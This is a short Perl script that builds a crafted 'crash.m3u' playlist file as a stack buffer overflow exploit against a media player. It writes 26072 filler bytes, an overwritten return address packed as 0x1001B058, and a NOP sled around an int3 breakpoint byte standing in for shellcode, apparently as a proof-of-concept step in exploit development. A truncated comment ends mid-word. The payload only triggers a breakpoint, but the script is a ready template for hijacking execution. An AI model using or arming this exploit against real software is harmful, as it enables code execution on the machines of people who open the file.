#! /usr/bin/perl

my $file= "crash.m3u";

my $junk= "\x41" x 26072;

my $eip = pack('V',0x1001B058);

my $shellcode = "\x90" x 20;

$shellcode = $shellcode."\xcc";  #this will cause the application to break, sim>
$shellcode = $shellcode."\x90" x 25;

open($FILE,">$file");
print $FILE $junk.$eip.$shellcode;
close($FILE);
print "m3u File Created successfully\n";
